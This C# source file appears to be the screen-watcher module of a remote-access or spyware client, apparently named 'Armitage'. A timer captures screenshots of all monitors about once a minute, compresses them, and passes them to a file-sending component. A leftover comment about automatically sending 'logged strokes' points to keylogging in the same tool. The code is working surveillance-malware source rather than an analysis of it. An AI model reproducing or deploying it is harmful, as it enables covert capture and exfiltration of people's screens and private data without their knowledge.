using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client.Armitage.Watchers
{
    public static class Screen_Watcher
    {
        #region Natives
        const int ENUM_CURRENT_SETTINGS = -1;
        public static int Ticket = 7;
        public static int MaxTicket = 6;

        public static int SendCounter = 0;
        [DllImport("user32.dll")]
        public static extern bool EnumDisplaySettings(string lpszDeviceName, int iModeNum, ref DEVMODE lpDevMode);

        [StructLayout(LayoutKind.Sequential)]
        public struct DEVMODE
        {
            private const int CCHDEVICENAME = 0x20;
            private const int CCHFORMNAME = 0x20;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 0x20)]
            public string dmDeviceName;
            public short dmSpecVersion;
            public short dmDriverVersion;
            public short dmSize;
            public short dmDriverExtra;
            public int dmFields;
            public int dmPositionX;
            public int dmPositionY;
            public ScreenOrientation dmDisplayOrientation;
            public int dmDisplayFixedOutput;
            public short dmColor;
            public short dmDuplex;
            public short dmYResolution;
            public short dmTTOption;
            public short dmCollate;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 0x20)]
            public string dmFormName;
            public short dmLogPixels;
            public int dmBitsPerPel;
            public int dmPelsWidth;
            public int dmPelsHeight;
            public int dmDisplayFlags;
            public int dmDisplayFrequency;
            public int dmICMMethod;
            public int dmICMIntent;
            public int dmMediaType;
            public int dmDitherType;
            public int dmReserved1;
            public int dmReserved2;
            public int dmPanningWidth;
            public int dmPanningHeight;
        }
        #endregion
        /// <summary>
        /// If nothing happened in 30 seconds just send a screenshot.
        /// </summary>
        private static int MaxTimeLimit = 60;

        private static System.Timers.Timer _refreshtimer;
        public static void Start()
        {
            _refreshtimer = new System.Timers.Timer();
            // Every 30 seconds, automatically send the logged strokes.
            _refreshtimer.Interval = MaxTimeLimit * 1000;
            _refreshtimer.Elapsed += _refreshtimer_Elapsed; ;
            _refreshtimer.Start();
        }
        private static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        /// <summary>
        /// Screenshots all monitors into a single bitmap.
        /// </summary>
        /// <returns>A byte array of the compressed screenshot.</returns>
        public static byte[] Screenshot() {
            /// Determine the size of the "virtual screen", which includes all monitors.
            int screenLeft = SystemInformation.VirtualScreen.Left;
            int screenTop = SystemInformation.VirtualScreen.Top;
            int screenWidth = 0;
            int screenHeight = 0;


            foreach (Screen screen in Screen.AllScreens)
            {
                DEVMODE dm = new DEVMODE();
                dm.dmSize = (short)Marshal.SizeOf(typeof(DEVMODE));
                EnumDisplaySettings(screen.DeviceName, ENUM_CURRENT_SETTINGS, ref dm);

                screenWidth += dm.dmPelsWidth;
                screenHeight += dm.dmPelsHeight;
            }
            /// Create a bitmap of the appropriate size to receive the screenshot.
            Bitmap bmp = new Bitmap(screenWidth, screenHeight);
            /// Draw the screenshot into our bitmap.
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
            }
            ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);

            // Create an Encoder object based on the GUID  
            // for the Quality parameter category.  
            System.Drawing.Imaging.Encoder quality = System.Drawing.Imaging.Encoder.Quality;

            // Create an EncoderParameters object.  
            // An EncoderParameters object has an array of EncoderParameter  
            // objects. In this case, there is only one  
            // EncoderParameter object in the array.  
            EncoderParameters encoderparams = new EncoderParameters(1);
            using (var mss = new MemoryStream())
            {
                EncoderParameter encoderparamsbuwithquality = new EncoderParameter(quality, 50L);
                encoderparams.Param[0] = encoderparamsbuwithquality;
                bmp.Save(mss, jpgEncoder, encoderparams);
                return mss.ToArray();
            }
            /// This way we get waaaaay smaller filesize.
        }

        public async static void SendOne() {
            await Task.Run(() => {
                var bytes = Screenshot();
                Communication.File_Stacker.Send(bytes, Communication.File_Stacker.Filetype.Screenshot);
            });
        }
        private static void _refreshtimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            SendOne();
        }
    }
}
